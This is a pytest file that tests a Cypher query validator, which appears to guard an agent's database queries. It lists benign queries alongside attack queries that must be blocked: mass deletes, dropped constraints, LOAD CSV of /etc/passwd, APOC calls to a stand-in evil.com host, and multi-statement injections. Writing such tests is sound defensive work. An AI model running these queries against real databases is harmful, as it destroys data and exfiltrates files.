"""Unit and adversarial tests for Cypher validator (Threat T5)."""

import pytest
from ontoagent.guards.cypher_validator import validate_cypher

BENIGN_CYPHER = [
    "MATCH (o:Order) RETURN count(o);",
    "MATCH (s:Seller)-[:FULFILLS]->(o:Order) RETURN s.seller_id, count(o) LIMIT 10;",
    "MATCH (c:Customer)-[:PLACED]->(o:Order) WHERE c.region = 'Southeast' RETURN count(o);",
    "MATCH (p:Product)<-[:CONTAINS]-(o:Order) RETURN p.product_id, count(o) ORDER BY count(o) DESC LIMIT 5;",
    "MATCH (o:Order)-[:HAS_REVIEW]->(r:Review) WHERE r.score <= 2 RETURN o.order_id, r.score LIMIT 20;",
    "MATCH (o:Order)-[:SHIPPED_AS]->(sh:Shipment) WHERE sh.is_late = true RETURN count(o);",
    "MATCH (s:Seller)-[:LOCATED_IN]->(st:State) RETURN st.code, count(s);",
    "MATCH (p:Product)-[:IN_CATEGORY]->(cat:Category) RETURN cat.category_en, count(p);",
    "OPTIONAL MATCH (o:Order)-[:HAS_REVIEW]->(r:Review) RETURN o.order_id, r.score LIMIT 10;",
    "UNWIND ['delivered', 'shipped'] AS st MATCH (o:Order {status: st}) RETURN count(o);",
    "WITH 'Southeast' AS reg MATCH (c:Customer {region: reg}) RETURN count(c);",
    "MATCH (s:Seller {seller_id: 's1'})-[:FULFILLS]->(o:Order) RETURN count(o);",
    "MATCH (o:Order) WHERE o.status = 'DELETE' RETURN count(o);",  # keyword inside string
    "MATCH (p:Product) WHERE p.category_group = 'DROP' RETURN count(p);",  # keyword inside string
    "MATCH (s:Seller)-[:SOLD]->(p:Product) RETURN s.seller_id, p.product_id LIMIT 10;",
    "MATCH (c:Customer) RETURN count(c);",
]

CYPHER_ATTACKS = [
    # Mutations
    ("CREATE (s:Seller {seller_id: 'evil'});", "SEC_NOT_READ_ONLY"),
    ("MATCH (s:Seller) DELETE s;", "SEC_NOT_READ_ONLY"),
    ("MATCH (o:Order) DETACH DELETE o;", "SEC_NOT_READ_ONLY"),
    ("MERGE (c:Customer {customer_unique_id: 'fake'});", "SEC_NOT_READ_ONLY"),
    ("MATCH (s:Seller) SET s.status = 'hacked';", "SEC_NOT_READ_ONLY"),
    ("MATCH (s:Seller) REMOVE s.seller_region;", "SEC_NOT_READ_ONLY"),
    ("DROP CONSTRAINT order_key;", "SEC_NOT_READ_ONLY"),
    ("DROP INDEX shipment_order;", "SEC_NOT_READ_ONLY"),
    ("LOAD CSV WITH HEADERS FROM 'file:///etc/passwd' AS row RETURN row;", "SEC_NOT_READ_ONLY"),
    ("FOREACH (x IN [1,2,3] | CREATE (:Node));", "SEC_NOT_READ_ONLY"),
    ("CALL dbms.components();", "SEC_NOT_READ_ONLY"),
    ("CALL apoc.load.json('http://evil.com');", "SEC_NOT_READ_ONLY"),
    ("CALL db.labels();", "SEC_NOT_READ_ONLY"),
    ("CALL db.schema.visualization();", "SEC_NOT_READ_ONLY"),
    ("USING PERIODIC COMMIT 500 LOAD CSV FROM 'http://leak' AS r RETURN r;", "SEC_NOT_READ_ONLY"),
    
    # Multi-statement injection
    ("MATCH (o:Order) RETURN count(o); DELETE o;", "SEC_MULTI_STATEMENT"),
    ("MATCH (s:Seller) RETURN count(s); MATCH (n) DETACH DELETE n;", "SEC_MULTI_STATEMENT"),
    ("RETURN 1; CREATE (:Hacker);", "SEC_MULTI_STATEMENT"),

    # Invalid starting clauses
    ("WHERE o.is_late = true RETURN o;", "SEC_INVALID_START"),
    ("ORDER BY o.order_id RETURN o;", "SEC_INVALID_START"),
]


@pytest.mark.parametrize("cypher", BENIGN_CYPHER)
def test_benign_cypher_queries_pass(cypher, ontology):
    res = validate_cypher(cypher, onto=ontology)
    assert res.ok, f"Benign Cypher failed: {cypher} with reason: {res.reasons}"
    assert res.rewritten_cypher is not None


@pytest.mark.parametrize("query,expected_code", CYPHER_ATTACKS)
def test_cypher_attacks_blocked(query, expected_code, ontology):
    res = validate_cypher(query, onto=ontology)
    assert not res.ok, f"Attack was allowed: {query}"
    assert res.code == expected_code or res.code.startswith("SEC_"), (
        f"Expected {expected_code}, got {res.code} for: {query}"
    )


def test_cypher_limit_clamped(ontology):
    query = "MATCH (o:Order) RETURN o.order_id LIMIT 1000;"
    res = validate_cypher(query, onto=ontology)
    assert res.ok
    assert "LIMIT 500" in res.rewritten_cypher
